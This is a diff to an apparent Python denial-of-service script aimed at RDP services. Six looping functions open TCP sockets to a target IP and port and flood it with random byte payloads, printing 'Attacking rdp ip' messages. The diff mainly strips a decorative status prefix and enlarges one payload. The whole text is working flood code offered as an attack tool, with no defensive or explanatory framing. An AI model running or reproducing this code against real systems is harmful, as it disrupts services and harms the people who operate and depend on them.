@@ -23,7 +23,6 @@ clear()
 
 def run1():
 	data = random._urandom(1025)
-	i = random.choice(("[ ! ] ","[ * ]","[ $ ]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -31,7 +30,7 @@ def run1():
 			s.send(data)
 			for x in range(time):
 				s.send(data)
-				print(i +"Attacking rdp ip {} and port {}".format(ip, port))
+				print("Attacking rdp ip {} and port {}".format(ip, port))
 		except:
 			s.close()
 
@@ -39,7 +38,6 @@ def run1():
 
 def run2():
 	data = random._urandom(818)
-	i = random.choice(("[ ! ] ","[ * ]","[ $ ]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -47,7 +45,7 @@ def run2():
 			s.send(data)
 			for x in range(time):
 				s.send(data)
-				print(i +"Attacking rdp ip {} and port {}".format(ip, port))
+				print("Attacking rdp ip {} and port {}".format(ip, port))
 		except:
 			s.close()
 
@@ -55,7 +53,6 @@ def run2():
 
 def run3():
 	data = random._urandom(1800)
-	i = random.choice(("[ ! ] ","[ * ]","[ $ ]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -63,7 +60,7 @@ def run3():
 			s.send(data)
 			for x in range(time):
 				s.send(data)
-				print(i +"Attacking rdp ip {} and port {}".format(ip, port))
+				print("Attacking rdp ip {} and port {}".format(ip, port))
 		except:
 			s.close()
 
@@ -71,7 +68,6 @@ def run3():
 
 def run4():
 	data = random._urandom(1000)
-	i = random.choice(("[ ! ] ","[ * ]","[ $ ]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -79,14 +75,13 @@ def run4():
 			s.send(data)
 			for x in range(time):
 				s.send(data)
-				print(i +"Attacking rdp ip {} and port {}".format(ip, port))
+				print("Attacking rdp ip {} and port {}".format(ip, port))
 		except:
 			s.close()
 
 
 def run5():
 	data = random._urandom(999)
-	i = random.choice(("[ ! ] ","[ * ]","[ $ ]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -94,14 +89,13 @@ def run5():
 			s.send(data)
 			for x in range(time):
 				s.send(data)
-				print(i +"Attacking rdp ip {} and port {}".format(ip, port))
+				print("Attacking rdp ip {} and port {}".format(ip, port))
 		except:
 			s.close()
 
 
 def run6():
-	data = random._urandom(16)
-	i = random.choice(("[ ! ] ","[ * ]","[ $ ]"))
+	data = random._urandom(2000)
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -109,7 +103,7 @@ def run6():
 			s.send(data)
 			for x in range(time):
 				s.send(data)
-				print(i +"Attacking rdp ip {} and port {}".format(ip, port))
+				print("Attacking rdp ip {} and port {}".format(ip, port))
 		except:
 			s.close()
 
